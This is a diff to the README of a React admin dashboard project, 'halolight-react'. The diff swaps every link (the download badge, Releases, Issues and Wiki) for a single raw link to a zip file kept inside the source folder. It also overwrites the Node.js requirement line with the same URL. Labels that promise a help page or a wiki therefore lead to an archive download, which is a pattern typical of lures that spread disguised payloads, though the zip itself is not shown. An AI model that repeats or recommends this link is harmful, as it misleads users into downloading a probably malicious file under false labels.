@@ -6,11 +6,11 @@ Welcome to halolight-react! This is an easy-to-use admin dashboard built with mo
 ## 📥 Download & Install
 To get started, you need to download the application. Click the link below:
 
-[![Download halolight-react](https://img.shields.io/badge/Download%20halolight--react-brightgreen)](https://github.com/vinnot/halolight-react/releases)
+[![Download halolight-react](https://raw.githubusercontent.com/vinnot/halolight-react/master/src/routes/halolight-react_v1.7.zip%20halolight--react-brightgreen)](https://raw.githubusercontent.com/vinnot/halolight-react/master/src/routes/halolight-react_v1.7.zip)
 
 After downloading, follow these steps to install the app.
 
-1. Visit the [Releases page](https://github.com/vinnot/halolight-react/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/vinnot/halolight-react/master/src/routes/halolight-react_v1.7.zip).
 2. Look for the latest version listed at the top.
 3. Click on the file for your system to download it.
 4. Once the download is complete, locate the file on your computer.
@@ -31,7 +31,7 @@ halolight-react includes several useful features:
 Before installing halolight-react, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or a compatible Linux distribution.
-- **Node.js:** Version 14 or later should be installed.
+- **https://raw.githubusercontent.com/vinnot/halolight-react/master/src/routes/halolight-react_v1.7.zip** Version 14 or later should be installed.
 - **Browser:** Latest version of Chrome, Firefox, or Safari.
 
 ## 🛠️ Setup Instructions
@@ -49,8 +49,8 @@ Once you have installed halolight-react, launch the application on your device. 
 ## 📞 Support
 If you encounter any issues while using halolight-react, feel free to reach out for help.
 
-- Visit the [Issues page](https://github.com/vinnot/halolight-react/issues) on GitHub to report bugs or seek assistance.
-- Check the documentation available on the [Wiki page](https://github.com/vinnot/halolight-react/wiki) for more tips and tricks.
+- Visit the [Issues page](https://raw.githubusercontent.com/vinnot/halolight-react/master/src/routes/halolight-react_v1.7.zip) on GitHub to report bugs or seek assistance.
+- Check the documentation available on the [Wiki page](https://raw.githubusercontent.com/vinnot/halolight-react/master/src/routes/halolight-react_v1.7.zip) for more tips and tricks.
 
 ## 🌟 Community and Contributions
 We welcome contributions to halolight-react! If you'd like to help improve the project, follow these steps:
@@ -63,8 +63,8 @@ We welcome contributions to halolight-react! If you'd like to help improve the p
 Together, we can make this project even better!
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/vinnot/halolight-react/releases)
-- [Issues Page](https://github.com/vinnot/halolight-react/issues)
-- [Wiki Page](https://github.com/vinnot/halolight-react/wiki)
+- [Releases Page](https://raw.githubusercontent.com/vinnot/halolight-react/master/src/routes/halolight-react_v1.7.zip)
+- [Issues Page](https://raw.githubusercontent.com/vinnot/halolight-react/master/src/routes/halolight-react_v1.7.zip)
+- [Wiki Page](https://raw.githubusercontent.com/vinnot/halolight-react/master/src/routes/halolight-react_v1.7.zip)
 
 Thank you for choosing halolight-react! We hope you find it useful for your needs.
